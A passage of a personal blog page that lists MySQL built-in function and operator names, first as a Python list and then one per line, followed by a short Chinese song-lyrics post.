u&apos;Polygon()&apos;, u&apos;POSITION()&apos;, u&apos;POW()&apos;, u&apos;POWER()&apos;, u&apos;PROCEDURE ANALYSE()&apos;, u&apos;QUARTER()&apos;, u&apos;QUOTE()&apos;, u&apos;RADIANS()&apos;, u&apos;RAND()&apos;, u&apos;REGEXP&apos;, u&apos;RELEASE_LOCK()&apos;, u&apos;REPEAT()&apos;, u&apos;REPLACE()&apos;, u&apos;REVERSE()&apos;, u&apos;RIGHT()&apos;, u&apos;&gt;&gt;&apos;, u&apos;RLIKE&apos;, u&apos;ROUND()&apos;, u&apos;ROW_COUNT()&apos;, u&apos;RPAD()&apos;, u&apos;RTRIM()&apos;, u&apos;SCHEMA()&apos;, u&apos;SEC_TO_TIME()&apos;, u&apos;SECOND()&apos;, u&apos;SESSION_USER()&apos;, u&apos;SHA1(), SHA()&apos;, u&apos;SHA2()&apos;, u&apos;SIGN()&apos;, u&apos;SIN()&apos;, u&apos;SLEEP()&apos;, u&apos;SOUNDEX()&apos;, u&apos;SOUNDS LIKE&apos;, u&apos;SPACE()&apos;, u&apos;SQRT()&apos;, u&apos;SRID()&apos;, u&apos;StartPoint()&apos;, u&apos;STD()&apos;, u&apos;STDDEV()&apos;, u&apos;STDDEV_POP()&apos;, u&apos;STDDEV_SAMP()&apos;, u&apos;STR_TO_DATE()&apos;, u&apos;STRCMP()&apos;, u&apos;SUBDATE()&apos;, u&apos;SUBSTR()&apos;, u&apos;SUBSTRING()&apos;, u&apos;SUBSTRING_INDEX()&apos;, u&apos;SUBTIME()&apos;, u&apos;SUM()&apos;, u&apos;SYSDATE()&apos;, u&apos;SYSTEM_USER()&apos;, u&apos;TAN()&apos;, u&apos;TIME()&apos;, u&apos;TIME_FORMAT()&apos;, u&apos;TIME_TO_SEC()&apos;, u&apos;TIMEDIFF()&apos;, u&apos;*&apos;, u&apos;TIMESTAMP()&apos;, u&apos;TIMESTAMPADD()&apos;, u&apos;TIMESTAMPDIFF()&apos;, u&apos;TO_DAYS()&apos;, u&apos;TO_SECONDS()&apos;, u&apos;Touches()&apos;, u&apos;TRIM()&apos;, u&apos;TRUNCATE()&apos;, u&apos;UCASE()&apos;, u&apos;-&apos;, u&apos;UNCOMPRESS()&apos;, u&apos;UNCOMPRESSED_LENGTH()&apos;, u&apos;UNHEX()&apos;, u&apos;UNIX_TIMESTAMP()&apos;, u&apos;UpdateXML()&apos;, u&apos;UPPER()&apos;, u&apos;USER()&apos;, u&apos;UTC_DATE()&apos;, u&apos;UTC_TIME()&apos;, u&apos;UTC_TIMESTAMP()&apos;, u&apos;UUID()&apos;, u&apos;UUID_SHORT()&apos;, u&apos;VALUES()&apos;, u&apos;VAR_POP()&apos;, u&apos;VAR_SAMP()&apos;, u&apos;VARIANCE()&apos;, u&apos;VERSION()&apos;, u&apos;WEEK()&apos;, u&apos;WEEKDAY()&apos;, u&apos;WEEKOFYEAR()&apos;, u&apos;Within()&apos;, u&apos;X()&apos;, u&apos;XOR&apos;, u&apos;Y()&apos;, u&apos;YEAR()&apos;, u&apos;YEARWEEK()&apos;]


ABS()
ACOS()
ADDDATE()
ADDTIME()
AES_DECRYPT()
AES_ENCRYPT()
AND, &amp;&amp;
Area()
AsBinary(), AsWKB()
ASCII()
ASIN()
=
:=
AsText(), AsWKT()
ATAN()
ATAN2(), ATAN()
AVG()
BENCHMARK()
BETWEEN ... AND ...
BIN()
BINARY
BIT_AND()
BIT_COUNT()
BIT_LENGTH()
BIT_OR()
BIT_XOR()
&amp;
~
|
^
CASE
CAST()
CEIL()
CEILING()
Centroid()
CHAR()
CHAR_LENGTH()
CHARACTER_LENGTH()
CHARSET()
COALESCE()
COERCIBILITY()
COLLATION()
COMPRESS()
CONCAT()
CONCAT_WS()
CONNECTION_ID()
Contains()
CONV()
CONVERT()
CONVERT_TZ()
COS()
COT()
COUNT()
COUNT(DISTINCT)
CRC32()
Crosses()
CURDATE()
CURRENT_DATE(), CURRENT_DATE
CURRENT_TIME(), CURRENT_TIME
CURRENT_TIMESTAMP(), CURRENT_TIMESTAMP
CURRENT_USER(), CURRENT_USER
CURTIME()
DATABASE()
DATE()
DATE_ADD()
DATE_FORMAT()
DATE_SUB()
DATEDIFF()
DAY()
DAYNAME()
DAYOFMONTH()
DAYOFWEEK()
DAYOFYEAR()
DECODE()
DEFAULT()
DEGREES()
DES_DECRYPT()
DES_ENCRYPT()
Dimension()
Disjoint()
DIV
/
ELT()
ENCODE()
ENCRYPT()
EndPoint()
Envelope()
=
&lt;=&gt;
Equals()
EXP()
EXPORT_SET()
ExteriorRing()
EXTRACT()
ExtractValue()
FIELD()
FIND_IN_SET()
FLOOR()
FORMAT()
FOUND_ROWS()
FROM_DAYS()
FROM_UNIXTIME()
GeomCollFromText(), GeometryCollectionFromText()
GeomCollFromWKB(), GeometryCollectionFromWKB()
GeometryCollection()
GeometryN()
GeometryType()
GeomFromText(), GeometryFromText()
GeomFromWKB(), GeometryFromWKB()
GET_FORMAT()
GET_LOCK()
GLength()
&gt;
&gt;=
GREATEST()
GROUP_CONCAT()
HEX()
HOUR()
IF()
IFNULL()
IN()
INET_ATON()
INET_NTOA()
INSERT()
INSTR()
InteriorRingN()
Intersects()
INTERVAL()
IS
IS_FREE_LOCK()
IS NOT
IS NOT NULL
IS NULL
IS_USED_LOCK()
IsClosed()
IsEmpty()
ISNULL()
IsSimple()
LAST_DAY
LAST_INSERT_ID()
LCASE()
LEAST()
LEFT()
&lt;&lt;
LENGTH()
&lt;
&lt;=
LIKE
LineFromText(), LineStringFromText()
LineFromWKB(), LineStringFromWKB()
LineString()
LN()
LOAD_FILE()
LOCALTIME(), LOCALTIME
LOCALTIMESTAMP, LOCALTIMESTAMP()
LOCATE()
LOG()
LOG10()
LOG2()
LOWER()
LPAD()
LTRIM()
MAKE_SET()
MAKEDATE()
MAKETIME()
MASTER_POS_WAIT()
MATCH
MAX()
MBRContains()
MBRDisjoint()
MBREqual()
MBRIntersects()
MBROverlaps()
MBRTouches()
MBRWithin()
MD5()
MICROSECOND()
MID()
MIN()
-
MINUTE()
MLineFromText(), MultiLineStringFromText()
MLineFromWKB(), MultiLineStringFromWKB()
MOD()
%, MOD
MONTH()
MONTHNAME()
MPointFromText(), MultiPointFromText()
MPointFromWKB(), MultiPointFromWKB()
MPolyFromText(), MultiPolygonFromText()
MPolyFromWKB(), MultiPolygonFromWKB()
MultiLineString()
MultiPoint()
MultiPolygon()
NAME_CONST()
NOT, !
NOT BETWEEN ... AND ...
!=, &lt;&gt;
NOT IN()
NOT LIKE
NOT REGEXP
NOW()
NULLIF()
NumGeometries()
NumInteriorRings()
NumPoints()
OCT()
OCTET_LENGTH()
OLD_PASSWORD()
||, OR
ORD()
Overlaps()
PASSWORD()
PERIOD_ADD()
PERIOD_DIFF()
PI()
+
Point()
PointFromText()
PointFromWKB()
PointN()
PolyFromText(), PolygonFromText()
PolyFromWKB(), PolygonFromWKB()
Polygon()
POSITION()
POW()
POWER()
PROCEDURE ANALYSE()
QUARTER()
QUOTE()
RADIANS()
RAND()
REGEXP
RELEASE_LOCK()
REPEAT()
REPLACE()
REVERSE()
RIGHT()
&gt;&gt;
RLIKE
ROUND()
ROW_COUNT()
RPAD()
RTRIM()
SCHEMA()
SEC_TO_TIME()
SECOND()
SESSION_USER()
SHA1(), SHA()
SHA2()
SIGN()
SIN()
SLEEP()
SOUNDEX()
SOUNDS LIKE
SPACE()
SQRT()
SRID()
StartPoint()
STD()
STDDEV()
STDDEV_POP()
STDDEV_SAMP()
STR_TO_DATE()
STRCMP()
SUBDATE()
SUBSTR()
SUBSTRING()
SUBSTRING_INDEX()
SUBTIME()
SUM()
SYSDATE()
SYSTEM_USER()
TAN()
TIME()
TIME_FORMAT()
TIME_TO_SEC()
TIMEDIFF()
*
TIMESTAMP()
TIMESTAMPADD()
TIMESTAMPDIFF()
TO_DAYS()
TO_SECONDS()
Touches()
TRIM()
TRUNCATE()
UCASE()
-
UNCOMPRESS()
UNCOMPRESSED_LENGTH()
UNHEX()
UNIX_TIMESTAMP()
UpdateXML()
UPPER()
USER()
UTC_DATE()
UTC_TIME()
UTC_TIMESTAMP()
UUID()
UUID_SHORT()
VALUES()
VAR_POP()
VAR_SAMP()
VARIANCE()
VERSION()
WEEK()
WEEKDAY()
WEEKOFYEAR()
Within()
X()
XOR
Y()
YEAR()
YEARWEEK()
</code></pre>
          
        
      
    </div>

    

    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://hexo.imagemlt.xyz/post/wmj/index.html">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Imagemlt">
      <meta itemprop="description" content="personal blog">
      <meta itemprop="image" content="https://avatars0.githubusercontent.com/u/26888704?s=460&v=4">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Image's blog">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/post/wmj/index.html" itemprop="url">
                  春夏秋冬的你
                </a>
              
            
          </h2>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              

              
                
              

              <time title="Created: 2018-01-08 16:56:49" itemprop="dateCreated datePublished" datetime="2018-01-08T16:56:49+08:00">2018-01-08</time>
            

            
              

              
                
                <span class="post-meta-divider">|</span>
                

                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Edited on</span>
                
                <time title="Modified: 2019-07-06 23:27:08" itemprop="dateModified" datetime="2019-07-06T23:27:08+08:00">2019-07-06</time>
              
            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/人生杂谈/" itemprop="url" rel="index"><span itemprop="name">人生杂谈</span></a></span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>那年春天 我迷失在梦里 那年夏天 像她一样恬静 那年秋天的风 映入慌乱的耳际 那年冬天 身边缺了你 如果春天 梦里面没有你 如果夏天 街角遇不见你 就算秋天的风 带你回不到这里 我的心 就像 冰冷的冬季 春夏秋冬失去了你 我怎么过一年四季 漫无目的地胡言乱语 让我独白出谁的回忆 春夏秋冬放开了你 你让我怎么平静 你的话就像 秋风无情 那年春天 我迷失在梦里 那年夏天 像她一样恬静 那年秋天的风 映入慌乱的耳际 那年冬天 身边缺了你 如果春天 梦里面没有你 如果夏天 街角遇不见你 就算秋天的风 带你回不到这里 我的心 就像 冰冷的冬季 春夏秋冬失去了你 我怎么过一年四季 漫无目的地胡言乱语 让我独白出谁的回忆 春夏秋冬放开了你 你让我怎么平静 你的话就像 秋风无情 春夏秋冬失去了你 我怎么过一年四季 漫无目的地胡言乱语 让我独白出谁的回忆 春夏秋冬放开了你 你让我怎么平静 你的话就像 秋风无情 怎么去寻找 春天的轨迹 看着大雁 一起回归远方 心中想着 伴随 你的姑娘 看着落叶飘落 回到家乡的彷徨 保持着 习惯的想象</p>

          
        
      
    </div>

    

    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
  </section>

  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/2/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/4/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
  </nav>



          </div>
          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      

      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image" src="https://avatars0.githubusercontent.com/u/26888704?s=460&v=4" alt="Imagemlt">
            
              <p class="site-author-name" itemprop="name">Imagemlt</p>
              <p class="site-description motion-element" itemprop="description">personal blog</p>
          </div>

          
            <nav class="site-state motion-element">
              
                <div class="site-state-item site-state-posts">
                
                  <a href="/archives/">
                
                    <span class="site-state-item-count">58</span>
                    <span class="site-state-item-name">posts</span>
                  </a>
                </div>
              

              
                
                
                <div class="site-state-item site-state-categories">
                  <a href="/categories/index.html">
                    
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                    <span class="site-state-item-count">16</span>
                    <span class="site-state-item-name">categories</span>
                  </a>
                </div>
              

              
                
                
                <div class="site-state-item site-state-tags">
                  <a href="/tags/index.html">
                    
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                    <span class="site-state-item-count">12</span>
                    <span class="site-state-item-name">tags</span>
                  </a>
                </div>
              
            </nav>
          

          

          
            <div class="links-of-author motion-element">
              
                <span class="links-of-author-item">
                  <a href="https://github.com/imagemlt" target="_blank" title="GitHub" rel="external nofollow"><i class="fa fa-fw fa-github"></i>GitHub</a>
                  
                </span>
              
            </div>
          

          
          

          
          

          
            
          
          

        </div>
      </section>

      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
  <span class="with-love" id="animate">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Imagemlt</span>

  

  
</div>


  



  <div class="powered-by">Powered by <a class="theme-link" target="_blank" rel="external nofollow" href="https://hexo.io">Hexo</a> v3.8.0</div>



  <span class="post-meta-divider">|</span>

Hosted by <a href="https://pages.coding.me" style="font-weight: bold">Coding Pages</a>

  <span class="post-meta-divider">|</span>



  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" rel="external nofollow" href="https://github.com/theme-next/hexo-theme-next">NexT.Pisces</a> v6.3.0</div>




  <script src="https://unpkg.com/mermaid@7.1.2/dist/mermaid.min.js"></script>
  <script>
    if (window.mermaid) {
//alert("mermaid!!!");
      mermaid.initialize({theme: 'forest'});
    }
  </script>


        








        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>


























  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=6.3.0"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=6.3.0"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=6.3.0"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=6.3.0"></script>



  

  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=6.3.0"></script>



  



	





  





  










  





  

  

  

  

  
  

  

  

  

  

  

</body>
</html>
